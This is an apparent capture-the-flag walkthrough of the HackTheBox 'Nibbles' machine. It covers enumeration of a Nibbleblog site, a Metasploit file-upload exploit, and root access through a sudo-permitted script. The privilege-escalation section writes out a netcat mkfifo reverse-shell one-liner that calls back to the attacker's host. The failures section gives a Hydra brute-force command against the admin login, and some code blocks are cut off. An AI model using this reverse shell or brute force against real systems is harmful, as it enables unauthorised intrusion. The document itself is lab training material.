## Manual Discovery
Navigating to the site we can see the following text and wappalyzer showing Apache and PHP:
![Nibbles1](images/Nibbles1.png)

Soure Code shows this:
![Nibbles2](images/Nibbles2.png)

Navigating to /nibbleblog present the following:
![Nibbles3](images/Nibbles3.png)

Ran a gubuster scan for the primary site, but /nibbleblog had much more interesting finds:

## Reading
Did some standard googling and came across a few interesting articles.
[CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-14941/Nibbleblog.html) - shows quite a few CVEs for this application
[WikiHak](https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/) - demonstrates how to upload a shell in nibbleblog 4.0.3

## Continued Manual Discovery
Began to manually navigate to each folder underneath /nibbleblog that returned a 301. From the WikiHak link above, it pointed us to /nibbleblog/plugins/my_image. Digging down further I hit the following URL and can see a file upload 'browse...' button, but nothing indicating I can 'save' it to the server:
```html
http://10.10.10.75/nibbleblog/plugins/my_image/plugin.bit
```

We have an admin login @ admin.php:

# Exploitation
---
## Metasploit
As much as I hate doing it, I started up msfconsole. Identified the appropriate exploit, set the lhost and rhost, but upon running 'exploit' it said I need to input a username and password.
```bash
msf6 > search nibbleblogo
[-] No results from search
msf6 > search nibbleblog

See Sub-section 'failures' for attempts at brute forcing the password. Ultimately, it seems that brute force will not work  - admin/nibbles is said to be the password according to numerous walk-throughs. Typically, I try to avoid walkthroughs, but this one stumped me. It does not appear that any of these walkthroughs demonstrate a method for brute-forcing either - it is said that they guessed this password correctly.

Moving on to metasploit, here are the options I ended up using:
```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > options

Module options (exploit/multi/http/nibbleblog_file_upload):

# Privilege Escalation
---
Sudo -l demonstrated that we can run a specific .sh file here:
```bash
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$
```

It wasn't present immediately, but was able to 'unzip' the personal. zip and drill down to this specific location.
Reviewed the .sh file and it doesn't seem to be anything important (or functional).

Backed up the monitor.sh file (`cp monitor.sh monitor.sh.bak`)
Pulled the Netcat OpenBSD command from [Here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) and customized:
```bash
echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f" > monitor.sh
```
Started the listener
Executed with sudo
Listener picked up

Confimed I was root, navigated to ~, cat'd out the root.txt and submitted the flag.

# Failures

## Source Code Review
Pulled the following string from the source code on the admin.php page for reference:
```html
<div class="title">Sign in to Nibbleblog admin area</div><form id="js_form" name="form" method="post"  ><div class="form_block" ><input class="username" name="username" type="text" placeholder="Username" autocomplete="off" maxlength="254" /></div><div class="form_block" ><input class="password" name="password" type="password" placeholder="Password" autocomplete="off" maxlength="254" /></div><div class="form_block" ><input type="checkbox" id="js_remember" name="remember" class="float"  value="1"/><label class="for_checkbox remember" for="js_remember" >Remember me</label><input type="submit" class="save" value="Login" /></div></form><a class="back" href="/nibbleblog/" >&larr;Back to blog</a>
```

## Burp Intercept
Started up proxy/intercept and sent through a failed login attempt to gather some additional info (looks like manual source code review would've been fine)

Just using 'username' and 'password' here, so that makes the Hydra run a little easier.
I had initially started by sending through the usual 'admin/admin', 'admin/password' but was locked out from attempting any further and had to reset the machine. We'll see if Hydra gets locked up, too.

From the above, we know the method is also 'post'. I grabbed the failure condition by sending through a failed admin/admin attempt:
![Nibbles5](images/Nibbles5.png)

## Hydra (Failed)
Began constructing brute force syntax via Hydra:
```bash
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=admin&password=^PASS^:Incorrect username or password"  
```
I believe the syntax was correct (had also tried variations of LOGIN=LOGIN:Incorrect username or password), however, even in the walkthroughs I'm seeing there isn't any way to effectively brute force the password here. I see that also after however many failed attempts the site blacklists your IP, which can be remedied, but it doesn't seem to me that anyone was able to effectively smash this password. If you have a link to a walk-through that successfully does this, please let me know in the comments.
